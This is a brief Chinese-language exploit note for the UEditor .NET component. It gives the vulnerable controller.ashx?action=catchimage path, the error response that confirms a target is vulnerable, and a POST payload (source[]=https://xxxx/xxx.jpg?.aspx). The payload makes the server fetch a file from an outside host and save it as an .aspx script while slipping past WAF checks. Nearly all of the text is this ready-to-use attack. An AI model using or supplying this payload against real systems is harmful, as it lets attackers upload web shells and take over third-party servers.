# Ueditor

---

- 影响版本：net

- 路径：/Ueditor/net/controller.ashx?action=catchimage

- 访问效果如下为存在漏洞：

  ```
  {"state":"参数错误：没用指定抓取源"}
  ```
  
- 利用

  绕过waf检测，xxx.jpg?.aspx以为是xxx.jpg，但其实是aspx

  ```
  /Ueditor/net/controller.ashx?action=catchimage
  postdata:
  source[]=https://xxxx/xxx.jpg?.aspx
  ```

  